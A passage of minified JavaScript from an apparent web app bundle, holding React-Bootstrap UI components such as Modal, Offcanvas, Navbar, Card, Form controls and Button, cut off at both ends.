            j.dialog && vr && !Ic(j.dialog, vr) && (ye.current = vr, j.dialog.focus())
        }
    }), ue = Ge(() => {
        if (j.remove(), Nn.current == null || Nn.current(), kn.current == null || kn.current(), g) {
            var te;
            (te = ye.current) == null || te.focus == null || te.focus(h), ye.current = null
        }
    });
    f.useEffect(() => {
        !n || !se || je()
    }, [n, se, je]), f.useEffect(() => {
        b && ue()
    }, [b, ue]), Hp(() => {
        ue()
    });
    const Se = Ge(() => {
        if (!C || !P() || !j.isTopModal()) return;
        const te = Al(X == null ? void 0 : X.document);
        j.dialog && te && !Ic(j.dialog, te) && j.dialog.focus()
    }), Lt = Ge(te => {
        te.target === te.currentTarget && (u == null || u(te), s === !0 && O())
    }), ul = Ge(te => {
        a && Q0(te) && j.isTopModal() && (c == null || c(te), te.defaultPrevented || O())
    }), kn = f.useRef(), Nn = f.useRef(), gr = (...te) => {
        W(!0), D == null || D(...te)
    };
    if (!se) return null;
    const xo = Object.assign({role: r, ref: j.setDialogRef, "aria-modal": r === "dialog" ? !0 : void 0}, fe, {
        style: i,
        className: o,
        tabIndex: -1
    });
    let yr = w ? w(xo) : m.jsx("div", Object.assign({}, xo, {children: f.cloneElement(l, {role: "document"})}));
    yr = Mc(d, p, {
        unmountOnExit: !0,
        mountOnEnter: !0,
        appear: !0,
        in: !!n,
        onExit: B,
        onExiting: M,
        onExited: gr,
        onEnter: A,
        onEntering: V,
        onEntered: ee,
        children: yr
    });
    let rn = null;
    return s && (rn = S({ref: j.setBackdropRef, onClick: Lt}), rn = Mc(x, y, {
        in: !!n,
        appear: !0,
        mountOnEnter: !0,
        unmountOnExit: !0,
        children: rn
    })), m.jsx(m.Fragment, {children: Hn.createPortal(m.jsxs(m.Fragment, {children: [rn, yr]}), se)})
});
Vp.displayName = "Modal";
const Kp = Object.assign(Vp, {Manager: Ja}), Z0 = {[ot]: "show", [wt]: "show"},
    Gp = f.forwardRef(({className: e, children: t, transitionClasses: n = {}, onEnter: r, ...o}, i) => {
        const l = {in: !1, timeout: 300, mountOnEnter: !1, unmountOnExit: !1, appear: !1, ...o},
            s = f.useCallback((a, u) => {
                zp(a), r == null || r(a, u)
            }, [r]);
        return m.jsx(Ya, {
            ref: i,
            addEndListener: Xa, ...l,
            onEnter: s,
            childRef: t.ref,
            children: (a, u) => f.cloneElement(t, {...u, className: L("fade", e, t.props.className, Z0[a], n[a])})
        })
    });
Gp.displayName = "Fade";
const Za = Gp, Qp = f.forwardRef(({
                                      className: e,
                                      bsPrefix: t,
                                      as: n = "div",
                                      ...r
                                  }, o) => (t = F(t, "offcanvas-body"), m.jsx(n, {ref: o, className: L(e, t), ...r})));
Qp.displayName = "OffcanvasBody";
const e1 = Qp, t1 = {[ot]: "show", [wt]: "show"}, Xp = f.forwardRef(({
                                                                         bsPrefix: e,
                                                                         className: t,
                                                                         children: n,
                                                                         in: r = !1,
                                                                         mountOnEnter: o = !1,
                                                                         unmountOnExit: i = !1,
                                                                         appear: l = !1,
                                                                         ...s
                                                                     }, a) => (e = F(e, "offcanvas"), m.jsx(Ya, {
    ref: a,
    addEndListener: Xa,
    in: r,
    mountOnEnter: o,
    unmountOnExit: i,
    appear: l, ...s,
    childRef: n.ref,
    children: (u, c) => f.cloneElement(n, {
        ...c,
        className: L(t, n.props.className, (u === ot || u === uo) && `${e}-toggling`, t1[u])
    })
})));
Xp.displayName = "OffcanvasToggling";
const n1 = Xp, r1 = f.createContext({
        onHide() {
        }
    }), eu = r1, o1 = {"aria-label": ke.string, onClick: ke.func, variant: ke.oneOf(["white"])},
    tu = f.forwardRef(({className: e, variant: t, "aria-label": n = "Close", ...r}, o) => m.jsx("button", {
        ref: o,
        type: "button",
        className: L("btn-close", t && `btn-close-${t}`, e),
        "aria-label": n, ...r
    }));
tu.displayName = "CloseButton";
tu.propTypes = o1;
const i1 = tu, l1 = f.forwardRef(({
                                      closeLabel: e = "Close",
                                      closeVariant: t,
                                      closeButton: n = !1,
                                      onHide: r,
                                      children: o,
                                      ...i
                                  }, l) => {
    const s = f.useContext(eu), a = Ge(() => {
        s == null || s.onHide(), r == null || r()
    });
    return m.jsxs("div", {ref: l, ...i, children: [o, n && m.jsx(i1, {"aria-label": e, variant: t, onClick: a})]})
}), Yp = l1, Jp = f.forwardRef(({
                                    bsPrefix: e,
                                    className: t,
                                    closeLabel: n = "Close",
                                    closeButton: r = !1,
                                    ...o
                                }, i) => (e = F(e, "offcanvas-header"), m.jsx(Yp, {
    ref: i, ...o,
    className: L(t, e),
    closeLabel: n,
    closeButton: r
})));
Jp.displayName = "OffcanvasHeader";
const s1 = Jp, rl = e => f.forwardRef((t, n) => m.jsx("div", {...t, ref: n, className: L(t.className, e)})),
    a1 = rl("h5"), qp = f.forwardRef(({
                                          className: e,
                                          bsPrefix: t,
                                          as: n = a1,
                                          ...r
                                      }, o) => (t = F(t, "offcanvas-title"), m.jsx(n, {
        ref: o,
        className: L(e, t), ...r
    })));
qp.displayName = "OffcanvasTitle";
const u1 = qp;

function c1(e, t) {
    return e.classList ? !!t && e.classList.contains(t) : (" " + (e.className.baseVal || e.className) + " ").indexOf(" " + t + " ") !== -1
}

function d1(e, t) {
    e.classList ? e.classList.add(t) : c1(e, t) || (typeof e.className == "string" ? e.className = e.className + " " + t : e.setAttribute("class", (e.className && e.className.baseVal || "") + " " + t))
}

var f1 = Function.prototype.bind.call(Function.prototype.call, [].slice);

function On(e, t) {
    return f1(e.querySelectorAll(t))
}

function $c(e, t) {
    return e.replace(new RegExp("(^|\\s)" + t + "(?:\\s|$)", "g"), "$1").replace(/\s+/g, " ").replace(/^\s*|\s*$/g, "")
}

function p1(e, t) {
    e.classList ? e.classList.remove(t) : typeof e.className == "string" ? e.className = $c(e.className, t) : e.setAttribute("class", $c(e.className && e.className.baseVal || "", t))
}

const _n = {
    FIXED_CONTENT: ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top",
    STICKY_CONTENT: ".sticky-top",
    NAVBAR_TOGGLER: ".navbar-toggler"
};

class Zp extends Ja {
    adjustAndStore(t, n, r) {
        const o = n.style[t];
        n.dataset[t] = o, Et(n, {[t]: `${parseFloat(Et(n, t)) + r}px`})
    }

    restore(t, n) {
        const r = n.dataset[t];
        r !== void 0 && (delete n.dataset[t], Et(n, {[t]: r}))
    }

    setContainerStyle(t) {
        super.setContainerStyle(t);
        const n = this.getElement();
        if (d1(n, "modal-open"), !t.scrollBarWidth) return;
        const r = this.isRTL ? "paddingLeft" : "paddingRight", o = this.isRTL ? "marginLeft" : "marginRight";
        On(n, _n.FIXED_CONTENT).forEach(i => this.adjustAndStore(r, i, t.scrollBarWidth)), On(n, _n.STICKY_CONTENT).forEach(i => this.adjustAndStore(o, i, -t.scrollBarWidth)), On(n, _n.NAVBAR_TOGGLER).forEach(i => this.adjustAndStore(o, i, t.scrollBarWidth))
    }

    removeContainerStyle(t) {
        super.removeContainerStyle(t);
        const n = this.getElement();
        p1(n, "modal-open");
        const r = this.isRTL ? "paddingLeft" : "paddingRight", o = this.isRTL ? "marginLeft" : "marginRight";
        On(n, _n.FIXED_CONTENT).forEach(i => this.restore(r, i)), On(n, _n.STICKY_CONTENT).forEach(i => this.restore(o, i)), On(n, _n.NAVBAR_TOGGLER).forEach(i => this.restore(o, i))
    }
}

let Ul;

function em(e) {
    return Ul || (Ul = new Zp(e)), Ul
}

function m1(e) {
    return m.jsx(n1, {...e})
}

function h1(e) {
    return m.jsx(Za, {...e})
}

const tm = f.forwardRef(({
                             bsPrefix: e,
                             className: t,
                             children: n,
                             "aria-labelledby": r,
                             placement: o = "start",
                             responsive: i,
                             show: l = !1,
                             backdrop: s = !0,
                             keyboard: a = !0,
                             scroll: u = !1,
                             onEscapeKeyDown: c,
                             onShow: d,
                             onHide: p,
                             container: x,
                             autoFocus: y = !0,
                             enforceFocus: v = !0,
                             restoreFocus: C = !0,
                             restoreFocusOptions: g,
                             onEntered: h,
                             onExit: w,
                             onExiting: S,
                             onEnter: E,
                             onEntering: N,
                             onExited: R,
                             backdropClassName: O,
                             manager: B,
                             renderStaticNode: D = !1,
                             ...M
                         }, A) => {
    const V = f.useRef();
    e = F(e, "offcanvas");
    const {onToggle: ee} = f.useContext(yo) || {}, [fe, X] = f.useState(!1), se = $0(i || "xs", "up");
    f.useEffect(() => {
        X(i ? l && !se : l)
    }, [l, i, se]);
    const j = Ge(() => {
        ee == null || ee(), p == null || p()
    }), P = f.useMemo(() => ({onHide: j}), [j]);

    function I() {
        return B || (u ? (V.current || (V.current = new Zp({handleContainerOverflow: !1})), V.current) : em())
    }

    const b = (ue, ...Se) => {
            ue && (ue.style.visibility = "visible"), E == null || E(ue, ...Se)
        }, W = (ue, ...Se) => {
            ue && (ue.style.visibility = ""), R == null || R(...Se)
        }, ye = f.useCallback(ue => m.jsx("div", {...ue, className: L(`${e}-backdrop`, O)}), [O, e]),
        je = ue => m.jsx("div", {
            ...ue, ...M,
            className: L(t, i ? `${e}-${i}` : e, `${e}-${o}`),
            "aria-labelledby": r,
            children: n
        });
    return m.jsxs(m.Fragment, {
        children: [!fe && (i || D) && je({}), m.jsx(eu.Provider, {
            value: P,
            children: m.jsx(Kp, {
                show: fe,
                ref: A,
                backdrop: s,
                container: x,
                keyboard: a,
                autoFocus: y,
                enforceFocus: v && !u,
                restoreFocus: C,
                restoreFocusOptions: g,
                onEscapeKeyDown: c,
                onShow: d,
                onHide: j,
                onEnter: b,
                onEntering: N,
                onEntered: h,
                onExit: w,
                onExiting: S,
                onExited: W,
                manager: I(),
                transition: m1,
                backdropTransition: h1,
                renderBackdrop: ye,
                renderDialog: je
            })
        })]
    })
});
tm.displayName = "Offcanvas";
const g1 = Object.assign(tm, {Body: e1, Header: s1, Title: u1}), nm = f.forwardRef((e, t) => {
    const n = f.useContext(yo);
    return m.jsx(g1, {ref: t, show: !!(n != null && n.expanded), ...e, renderStaticNode: !0})
});
nm.displayName = "NavbarOffcanvas";
const y1 = nm, rm = f.forwardRef(({
                                      className: e,
                                      bsPrefix: t,
                                      as: n = "span",
                                      ...r
                                  }, o) => (t = F(t, "navbar-text"), m.jsx(n, {ref: o, className: L(e, t), ...r})));
rm.displayName = "NavbarText";
const v1 = rm, om = f.forwardRef((e, t) => {
    const {
        bsPrefix: n,
        expand: r = !0,
        variant: o = "light",
        bg: i,
        fixed: l,
        sticky: s,
        className: a,
        as: u = "nav",
        expanded: c,
        onToggle: d,
        onSelect: p,
        collapseOnSelect: x = !1,
        ...y
    } = t0(e, {expanded: "onToggle"}), v = F(n, "navbar"), C = f.useCallback((...w) => {
        p == null || p(...w), x && c && (d == null || d(!1))
    }, [p, x, c, d]);
    y.role === void 0 && u !== "nav" && (y.role = "navigation");
    let g = `${v}-expand`;
    typeof r == "string" && (g = `${g}-${r}`);
    const h = f.useMemo(() => ({
        onToggle: () => d == null ? void 0 : d(!c),
        bsPrefix: v,
        expanded: !!c,
        expand: r
    }), [v, c, r, d]);
    return m.jsx(yo.Provider, {
        value: h,
        children: m.jsx(Jv.Provider, {
            value: C,
            children: m.jsx(u, {
                ref: t, ...y,
                className: L(a, v, r && g, o && `${v}-${o}`, i && `bg-${i}`, s && `sticky-${s}`, l && `fixed-${l}`)
            })
        })
    })
});
om.displayName = "Navbar";
const ft = Object.assign(om, {Brand: r0, Collapse: O0, Offcanvas: y1, Text: v1, Toggle: P0}),
    im = f.forwardRef(({className: e, bsPrefix: t, as: n = "div", ...r}, o) => (t = F(t, "card-body"), m.jsx(n, {
        ref: o,
        className: L(e, t), ...r
    })));
im.displayName = "CardBody";
const lm = im, sm = f.forwardRef(({
                                      className: e,
                                      bsPrefix: t,
                                      as: n = "div",
                                      ...r
                                  }, o) => (t = F(t, "card-footer"), m.jsx(n, {ref: o, className: L(e, t), ...r})));
sm.displayName = "CardFooter";
const w1 = sm, am = f.createContext(null);
am.displayName = "CardHeaderContext";
const x1 = am, um = f.forwardRef(({bsPrefix: e, className: t, as: n = "div", ...r}, o) => {
    const i = F(e, "card-header"), l = f.useMemo(() => ({cardHeaderBsPrefix: i}), [i]);
    return m.jsx(x1.Provider, {value: l, children: m.jsx(n, {ref: o, ...r, className: L(t, i)})})
});
um.displayName = "CardHeader";
const S1 = um, cm = f.forwardRef(({bsPrefix: e, className: t, variant: n, as: r = "img", ...o}, i) => {
    const l = F(e, "card-img");
    return m.jsx(r, {ref: i, className: L(n ? `${l}-${n}` : l, t), ...o})
});
cm.displayName = "CardImg";
const C1 = cm, dm = f.forwardRef(({
                                      className: e,
                                      bsPrefix: t,
                                      as: n = "div",
                                      ...r
                                  }, o) => (t = F(t, "card-img-overlay"), m.jsx(n, {
    ref: o,
    className: L(e, t), ...r
})));
dm.displayName = "CardImgOverlay";
const E1 = dm,
    fm = f.forwardRef(({className: e, bsPrefix: t, as: n = "a", ...r}, o) => (t = F(t, "card-link"), m.jsx(n, {
        ref: o,
        className: L(e, t), ...r
    })));
fm.displayName = "CardLink";
const k1 = fm, N1 = rl("h6"), pm = f.forwardRef(({
                                                     className: e,
                                                     bsPrefix: t,
                                                     as: n = N1,
                                                     ...r
                                                 }, o) => (t = F(t, "card-subtitle"), m.jsx(n, {
    ref: o,
    className: L(e, t), ...r
})));
pm.displayName = "CardSubtitle";
const R1 = pm,
    mm = f.forwardRef(({className: e, bsPrefix: t, as: n = "p", ...r}, o) => (t = F(t, "card-text"), m.jsx(n, {
        ref: o,
        className: L(e, t), ...r
    })));
mm.displayName = "CardText";
const T1 = mm, j1 = rl("h5"),
    hm = f.forwardRef(({className: e, bsPrefix: t, as: n = j1, ...r}, o) => (t = F(t, "card-title"), m.jsx(n, {
        ref: o,
        className: L(e, t), ...r
    })));
hm.displayName = "CardTitle";
const O1 = hm, gm = f.forwardRef(({
                                      bsPrefix: e,
                                      className: t,
                                      bg: n,
                                      text: r,
                                      border: o,
                                      body: i = !1,
                                      children: l,
                                      as: s = "div",
                                      ...a
                                  }, u) => {
    const c = F(e, "card");
    return m.jsx(s, {
        ref: u, ...a,
        className: L(t, c, n && `bg-${n}`, r && `text-${r}`, o && `border-${o}`),
        children: i ? m.jsx(lm, {children: l}) : l
    })
});
gm.displayName = "Card";
const Yn = Object.assign(gm, {
        Img: C1,
        Title: O1,
        Subtitle: R1,
        Body: lm,
        Link: k1,
        Text: T1,
        Header: S1,
        Footer: w1,
        ImgOverlay: E1
    }), _1 = {type: ke.string, tooltip: ke.bool, as: ke.elementType},
    nu = f.forwardRef(({as: e = "div", className: t, type: n = "valid", tooltip: r = !1, ...o}, i) => m.jsx(e, {
        ...o,
        ref: i,
        className: L(t, `${n}-${r ? "tooltip" : "feedback"}`)
    }));
nu.displayName = "Feedback";
nu.propTypes = _1;
const ym = nu, P1 = f.createContext({}), Ot = P1, vm = f.forwardRef(({
                                                                         id: e,
                                                                         bsPrefix: t,
                                                                         className: n,
                                                                         type: r = "checkbox",
                                                                         isValid: o = !1,
                                                                         isInvalid: i = !1,
                                                                         as: l = "input",
                                                                         ...s
                                                                     }, a) => {
    const {controlId: u} = f.useContext(Ot);
    return t = F(t, "form-check-input"), m.jsx(l, {
        ...s,
        ref: a,
        type: r,
        id: e || u,
        className: L(n, t, o && "is-valid", i && "is-invalid")
    })
});
vm.displayName = "FormCheckInput";
const wm = vm, xm = f.forwardRef(({bsPrefix: e, className: t, htmlFor: n, ...r}, o) => {
    const {controlId: i} = f.useContext(Ot);
    return e = F(e, "form-check-label"), m.jsx("label", {...r, ref: o, htmlFor: n || i, className: L(t, e)})
});
xm.displayName = "FormCheckLabel";
const Gs = xm;

function L1(e, t) {
    let n = 0;
    return f.Children.map(e, r => f.isValidElement(r) ? t(r, n++) : r)
}

function I1(e, t) {
    return f.Children.toArray(e).some(n => f.isValidElement(n) && n.type === t)
}

const Sm = f.forwardRef(({
                             id: e,
                             bsPrefix: t,
                             bsSwitchPrefix: n,
                             inline: r = !1,
                             reverse: o = !1,
                             disabled: i = !1,
                             isValid: l = !1,
                             isInvalid: s = !1,
                             feedbackTooltip: a = !1,
                             feedback: u,
                             feedbackType: c,
                             className: d,
                             style: p,
                             title: x = "",
                             type: y = "checkbox",
                             label: v,
                             children: C,
                             as: g = "input",
                             ...h
                         }, w) => {
    t = F(t, "form-check"), n = F(n, "form-switch");
    const {controlId: S} = f.useContext(Ot), E = f.useMemo(() => ({controlId: e || S}), [S, e]),
        N = !C && v != null && v !== !1 || I1(C, Gs), R = m.jsx(wm, {
            ...h,
            type: y === "switch" ? "checkbox" : y,
            ref: w,
            isValid: l,
            isInvalid: s,
            disabled: i,
            as: g
        });
    return m.jsx(Ot.Provider, {
        value: E,
        children: m.jsx("div", {
            style: p,
            className: L(d, N && t, r && `${t}-inline`, o && `${t}-reverse`, y === "switch" && n),
            children: C || m.jsxs(m.Fragment, {
                children: [R, N && m.jsx(Gs, {
                    title: x,
                    children: v
                }), u && m.jsx(ym, {type: c, tooltip: a, children: u})]
            })
        })
    })
});
Sm.displayName = "FormCheck";
const Oi = Object.assign(Sm, {Input: wm, Label: Gs}), Cm = f.forwardRef(({
                                                                             bsPrefix: e,
                                                                             type: t,
                                                                             size: n,
                                                                             htmlSize: r,
                                                                             id: o,
                                                                             className: i,
                                                                             isValid: l = !1,
                                                                             isInvalid: s = !1,
                                                                             plaintext: a,
                                                                             readOnly: u,
                                                                             as: c = "input",
                                                                             ...d
                                                                         }, p) => {
    const {controlId: x} = f.useContext(Ot);
    return e = F(e, "form-control"), m.jsx(c, {
        ...d,
        type: t,
        size: r,
        ref: p,
        readOnly: u,
        id: o || x,
        className: L(i, a ? `${e}-plaintext` : e, n && `${e}-${n}`, t === "color" && `${e}-color`, l && "is-valid", s && "is-invalid")
    })
});
Cm.displayName = "FormControl";
const D1 = Object.assign(Cm, {Feedback: ym}), Em = f.forwardRef(({
                                                                     className: e,
                                                                     bsPrefix: t,
                                                                     as: n = "div",
                                                                     ...r
                                                                 }, o) => (t = F(t, "form-floating"), m.jsx(n, {
    ref: o,
    className: L(e, t), ...r
})));
Em.displayName = "FormFloating";
const M1 = Em, km = f.forwardRef(({controlId: e, as: t = "div", ...n}, r) => {
    const o = f.useMemo(() => ({controlId: e}), [e]);
    return m.jsx(Ot.Provider, {value: o, children: m.jsx(t, {...n, ref: r})})
});
km.displayName = "FormGroup";
const Nm = km;

function $1({as: e, bsPrefix: t, className: n, ...r}) {
    t = F(t, "col");
    const o = jp(), i = Op(), l = [], s = [];
    return o.forEach(a => {
        const u = r[a];
        delete r[a];
        let c, d, p;
        typeof u == "object" && u != null ? {span: c, offset: d, order: p} = u : c = u;
        const x = a !== i ? `-${a}` : "";
        c && l.push(c === !0 ? `${t}${x}` : `${t}${x}-${c}`), p != null && s.push(`order${x}-${p}`), d != null && s.push(`offset${x}-${d}`)
    }), [{...r, className: L(n, ...l, ...s)}, {as: e, bsPrefix: t, spans: l}]
}

const Rm = f.forwardRef((e, t) => {
    const [{className: n, ...r}, {as: o = "div", bsPrefix: i, spans: l}] = $1(e);
    return m.jsx(o, {...r, ref: t, className: L(n, !l.length && i)})
});
Rm.displayName = "Col";
const wn = Rm, Tm = f.forwardRef(({
                                      as: e = "label",
                                      bsPrefix: t,
                                      column: n = !1,
                                      visuallyHidden: r = !1,
                                      className: o,
                                      htmlFor: i,
                                      ...l
                                  }, s) => {
    const {controlId: a} = f.useContext(Ot);
    t = F(t, "form-label");
    let u = "col-form-label";
    typeof n == "string" && (u = `${u} ${u}-${n}`);
    const c = L(o, t, r && "visually-hidden", n && u);
    return i = i || a, n ? m.jsx(wn, {ref: s, as: "label", className: c, htmlFor: i, ...l}) : m.jsx(e, {
        ref: s,
        className: c,
        htmlFor: i, ...l
    })
});
Tm.displayName = "FormLabel";
const F1 = Tm, jm = f.forwardRef(({bsPrefix: e, className: t, id: n, ...r}, o) => {
    const {controlId: i} = f.useContext(Ot);
    return e = F(e, "form-range"), m.jsx("input", {...r, type: "range", ref: o, className: L(t, e), id: n || i})
});
jm.displayName = "FormRange";
const A1 = jm, Om = f.forwardRef(({
                                      bsPrefix: e,
                                      size: t,
                                      htmlSize: n,
                                      className: r,
                                      isValid: o = !1,
                                      isInvalid: i = !1,
                                      id: l,
                                      ...s
                                  }, a) => {
    const {controlId: u} = f.useContext(Ot);
    return e = F(e, "form-select"), m.jsx("select", {
        ...s,
        size: n,
        ref: a,
        className: L(r, e, t && `${e}-${t}`, o && "is-valid", i && "is-invalid"),
        id: l || u
    })
});
Om.displayName = "FormSelect";
const z1 = Om, _m = f.forwardRef(({
                                      bsPrefix: e,
                                      className: t,
                                      as: n = "small",
                                      muted: r,
                                      ...o
                                  }, i) => (e = F(e, "form-text"), m.jsx(n, {
    ...o,
    ref: i,
    className: L(t, e, r && "text-muted")
})));
_m.displayName = "FormText";
const B1 = _m, Pm = f.forwardRef((e, t) => m.jsx(Oi, {...e, ref: t, type: "switch"}));
Pm.displayName = "Switch";
const U1 = Object.assign(Pm, {Input: Oi.Input, Label: Oi.Label}), Lm = f.forwardRef(({
                                                                                         bsPrefix: e,
                                                                                         className: t,
                                                                                         children: n,
                                                                                         controlId: r,
                                                                                         label: o,
                                                                                         ...i
                                                                                     }, l) => (e = F(e, "form-floating"), m.jsxs(Nm, {
    ref: l,
    className: L(t, e),
    controlId: r, ...i,
    children: [n, m.jsx("label", {htmlFor: r, children: o})]
})));
Lm.displayName = "FloatingLabel";
const b1 = Lm, H1 = {_ref: ke.any, validated: ke.bool, as: ke.elementType},
    ru = f.forwardRef(({className: e, validated: t, as: n = "form", ...r}, o) => m.jsx(n, {
        ...r,
        ref: o,
        className: L(e, t && "was-validated")
    }));
ru.displayName = "Form";
ru.propTypes = H1;
const K = Object.assign(ru, {
    Group: Nm,
    Control: D1,
    Floating: M1,
    Check: Oi,
    Switch: U1,
    Label: F1,
    Text: B1,
    Range: A1,
    Select: z1,
    FloatingLabel: b1
}), Im = "assets/fb-logo-35b61e19.webp";

function W1() {
    return f.useState(null)
}

const V1 = ["as", "disabled"];

function K1(e, t) {
    if (e == null) return {};
    var n = {}, r = Object.keys(e), o, i;
    for (i = 0; i < r.length; i++) o = r[i], !(t.indexOf(o) >= 0) && (n[o] = e[o]);
    return n
}

function G1(e) {
    return !e || e.trim() === "#"
}

function Dm({tagName: e, disabled: t, href: n, target: r, rel: o, role: i, onClick: l, tabIndex: s = 0, type: a}) {
    e || (n != null || r != null || o != null ? e = "a" : e = "button");
    const u = {tagName: e};
    if (e === "button") return [{type: a || "button", disabled: t}, u];
    const c = p => {
        if ((t || e === "a" && G1(n)) && p.preventDefault(), t) {
            p.stopPropagation();
            return
        }
        l == null || l(p)
    }, d = p => {
        p.key === " " && (p.preventDefault(), c(p))
    };
    return e === "a" && (n || (n = "#"), t && (n = void 0)), [{
        role: i ?? "button",
        disabled: void 0,
        tabIndex: t ? void 0 : s,
        href: n,
        target: e === "a" ? r : void 0,
        "aria-disabled": t || void 0,
        rel: e === "a" ? o : void 0,
        onClick: c,
        onKeyDown: d
    }, u]
}

const Q1 = f.forwardRef((e, t) => {
    let {as: n, disabled: r} = e, o = K1(e, V1);
    const [i, {tagName: l}] = Dm(Object.assign({tagName: n, disabled: r}, o));
    return m.jsx(l, Object.assign({}, o, i, {ref: t}))
});
Q1.displayName = "Button";
const Mm = f.forwardRef(({
                             as: e,
                             bsPrefix: t,
                             variant: n = "primary",
                             size: r,
                             active: o = !1,
                             disabled: i = !1,
                             className: l,
                             ...s
                         }, a) => {
    const u = F(t, "btn"), [c, {tagName: d}] = Dm({tagName: e, disabled: i, ...s}), p = d;
    return m.jsx(p, {
        ...c, ...s,
        ref: a,
        disabled: i,
        className: L(l, u, o && "active", n && `${u}-${n}`, r && `${u}-${r}`, s.href && i && "disabled")
    })
});
Mm.displayName = "Button";
const Jn = Mm;
var Bo;

function Fc(e) {
    if ((!Bo && Bo !== 0 || e) && pr) {
        var t = document.createElement("div");
        t.style.position = "absolute", t.style.top = "-9999px", t.style.width = "50px", t.style.height = "50px", t.style.overflow = "scroll", document.body.appendChild(t), Bo = t.offsetWidth - t.clientWidth, document.body.removeChild(t)
    }
    return Bo
}

const $m = f.forwardRef(({
                             className: e,
                             bsPrefix: t,
                             as: n = "div",
                             ...r
                         }, o) => (t = F(t, "modal-body"), m.jsx(n, {ref: o, className: L(e, t), ...r})));
$m.displayName = "ModalBody";
const X1 = $m, Fm = f.forwardRef(({
                                      bsPrefix: e,
                                      className: t,
                                      contentClassName: n,
                                      centered: r,
                                      size: o,
                                      fullscreen: i,
                                      children: l,
                                      scrollable: s,
                                      ...a
                                  }, u) => {
    e = F(e, "modal");
    const c = `${e}-dialog`, d = typeof i == "string" ? `${e}-fullscreen-${i}` : `${e}-fullscreen`;
    return m.jsx("div", {
        ...a,
        ref: u,
        className: L(c, t, o && `${e}-${o}`, r && `${c}-centered`, s && `${c}-scrollable`, i && d),
        children: m.jsx("div", {className: L(`${e}-content`, n), children: l})
    })
});
Fm.displayName = "ModalDialog";
const Am = Fm, zm = f.forwardRef(({
                                      className: e,
                                      bsPrefix: t,
                                      as: n = "div",
                                      ...r
                                  }, o) => (t = F(t, "modal-footer"), m.jsx(n, {ref: o, className: L(e, t), ...r})));
zm.displayName = "ModalFooter";
const Y1 = zm, Bm = f.forwardRef(({
                                      bsPrefix: e,
                                      className: t,
                                      closeLabel: n = "Close",
                                      closeButton: r = !1,
                                      ...o
                                  }, i) => {
    e = F(e, "modal-header");

    return m.jsx(Yp, {
        ref: i,
        ...o,
        className: L(t, e),
        closeLabel: n,
        closeButton: r
    });
});
Bm.displayName = "ModalHeader";
const J1 = Bm, q1 = rl("h4"),
    Um = f.forwardRef(({className: e, bsPrefix: t, as: n = q1, ...r}, o) => (t = F(t, "modal-title"), m.jsx(n, {
        ref: o,
        className: L(e, t), ...r
    })));
Um.displayName = "ModalTitle";
const Z1 = Um;

function ew(e) {
    return m.jsx(Za, {...e, timeout: null})
}

function tw(e) {
    return m.jsx(Za, {...e, timeout: null})
}

const bm = f.forwardRef(({
                             bsPrefix: e,
                             className: t,
                             style: n,
                             dialogClassName: r,
                             contentClassName: o,
                             children: i,
                             dialogAs: l = Am,
                             "aria-labelledby": s,
                             "aria-describedby": a,
                             "aria-label": u,
                             show: c = !1,
                             animation: d = !0,
                             backdrop: p = !0,
                             keyboard: x = !0,
                             onEscapeKeyDown: y,
                             onShow: v,
                             onHide: C,
                             container: g,
                             autoFocus: h = !0,
                             enforceFocus: w = !0,
                             restoreFocus: S = !0,
                             restoreFocusOptions: E,
                             onEntered: N,
                             onExit: R,
                             onExiting: O,
                             onEnter: B,
                             onEntering: D,
                             onExited: M,
                             backdropClassName: A,
                             manager: V,
                             ...ee
                         }, fe) => {
    const [X, se] = f.useState({}), [j, P] = f.useState(!1), I = f.useRef(!1), b = f.useRef(!1),
        W = f.useRef(null), [ye, je] = W1(), ue = nl(fe, je), Se = Ge(C), Lt = Xv();
    e = F(e, "modal");
    const ul = f.useMemo(() => ({onHide: Se}), [Se]);

    function kn() {
        return V || em({isRTL: Lt})
    }

    function Nn(G) {
        if (!pr) return;
        const Rn = kn().getScrollbarWidth() > 0, du = G.scrollHeight > tl(G).documentElement.clientHeight;
        se({paddingRight: Rn && !du ? Fc() : void 0, paddingLeft: !Rn && du ? Fc() : void 0})
    }

    const gr = Ge(() => {
        ye && Nn(ye.dialog)
    });
    Hp(() => {
        Ws(window, "resize", gr), W.current == null || W.current()
    });
    const xo = () => {
            I.current = !0
        }, yr = G => {
            I.current && ye && G.target === ye.dialog && (b.current = !0), I.current = !1
        }, rn = () => {
            P(!0), W.current = Ap(ye.dialog, () => {
                P(!1)
            })
        }, te = G => {
            G.target === G.currentTarget && rn()
        }, So = G => {
            if (p === "static") {
                te(G);
                return
            }
            if (b.current || G.target !== G.currentTarget) {
                b.current = !1;
                return
            }
            C == null || C()
        }, vr = G => {
            x ? y == null || y(G) : (G.preventDefault(), p === "static" && rn())
        }, Ch = (G, Rn) => {
            G && Nn(G), B == null || B(G, Rn)
        }, Eh = G => {
            W.current == null || W.current(), R == null || R(G)
        }, kh = (G, Rn) => {
            D == null || D(G, Rn), Fp(window, "resize", gr)
        }, Nh = G => {
            G && (G.style.display = ""), M == null || M(G), Ws(window, "resize", gr)
        }, Rh = f.useCallback(G => m.jsx("div", {...G, className: L(`${e}-backdrop`, A, !d && "show")}), [d, A, e]),
        cu = {...n, ...X};
    cu.display = "block";
    const Th = G => m.jsx("div", {
        role: "dialog", ...G,
        style: cu,
        className: L(t, e, j && `${e}-static`, !d && "show"),
        onClick: p ? So : void 0,
        onMouseUp: yr,
        "aria-label": u,
        "aria-labelledby": s,
        "aria-describedby": a,
        children: m.jsx(l, {...ee, onMouseDown: xo, className: r, contentClassName: o, children: i})
    });
    return m.jsx(eu.Provider, {
        value: ul,
        children: m.jsx(Kp, {
            show: c,
            ref: ue,
            backdrop: p,
            container: g,
            keyboard: !0,
            autoFocus: h,
            enforceFocus: w,
            restoreFocus: S,
            restoreFocusOptions: E,
            onEscapeKeyDown: vr,
            onShow: v,
            onHide: C,
            onEnter: Ch,
            onEntering: kh,
            onEntered: N,
            onExit: Eh,
            onExiting: O,
            onExited: Nh,
            manager: kn(),
            transition: d ? ew : void 0,
            backdropTransition: d ? tw : void 0,
            renderBackdrop: Rh,
            renderDialog: Th
        })
    })
});
bm.displayName = "Modal";
const jr = Object.assign(bm, {
    Body: X1,
    Header: J1,
    Title: Z1,
    Footer: Y1,
    Dialog: Am,
    TRANSITION_DURATION: 300,
    BACKDROP_TRANSITION_DURATION: 150
}), Ac = 1e3;

function nw(e, t, n) {
    const r = (e - t) / (n - t) * 100;
    return Math.round(r * Ac) / Ac
}

function zc({
                min: e,
                now: t,
                max: n,
                label: r,
                visuallyHidden: o,
                striped: i,
                animated: l,
